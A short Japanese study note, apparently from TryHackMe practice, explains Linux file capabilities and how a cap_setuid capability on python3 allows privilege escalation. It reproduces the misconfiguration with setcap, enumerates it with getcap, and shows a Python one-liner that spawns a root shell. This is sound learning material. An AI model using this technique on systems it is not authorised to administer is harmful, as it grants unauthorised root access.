## Capabilities
[参考記事](https://infosecwriteups.com/how-capabilities-actually-work-exploitation-privilege-escalation-536afee917ad)

root以外の特権概念．詳細な権限付与を可能にすることで最小限の権限をプロセスに許可できるようになる．
THMでは[Task8](https://tryhackme.com/room/linprivesc?source=post_page-----536afee917ad--------------------------------)に権限昇格問題としてcapabilityを扱っている．
色んな権限の種類があるので、１番わかりやすい`cap_setuid`が付与されているシナリオを考える．

ペネトレ系の問題は設定の不備の列挙が基本になるはず．capabilityの場合`getcap -r / 2>/dev/null`でできる．(単純に全探索してるので`/proc`まわりのファイルのcapabilityを調べるとfailしてエラーまみれになる、そのため`2>/dev/null`としている)

capabilityを指定のファイルに付与する場合、３要素から指定が可能である．[man](https://man.archlinux.org/man/capabilities.7#File_capabilities)に詳細が記載されている．ここではコマンドのオプション指定に関わるもののみ簡単にまとめる．
* Permitted: 権限許可
* Inheritable: 子プロセスへの権限継承
* Effective: 権限適用

ドキュメントのニュアンスを拾えなくて雑な説明になるが、`pe`を与えることで内部の`execve`が呼ばれたときの検証を通ることができるようだ．

デフォルトのUbuntuに設定不備は存在しないのでシナリオ通りの設定不備をあえて再現させる．
```
sudo setcap cap_setuid=+ep /usr/bin/python3.10
```

```
suke@klmbox:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/snap/core22/858/usr/bin/ping cap_net_raw=ep
/snap/core22/864/usr/bin/ping cap_net_raw=ep
/snap/core20/1974/usr/bin/ping cap_net_raw=ep
/snap/core20/2015/usr/bin/ping cap_net_raw=ep
```

pythonでルートシェルの立ち上げが可能になる．(`cap_setuid=ep`なので)

```
suke@klmbox:~$ /usr/bin/python3.10 -c "import os; os.setuid(0); os.system('/bin/bash')"
root@klmbox:~# whoami
root
root@klmbox:~#
```
`SUID`と違った権限(UIDの操作権限)であるため、所有者がrootの`SUID`が許可されたファイル列挙からはこれが見つからないことに注目すべきである．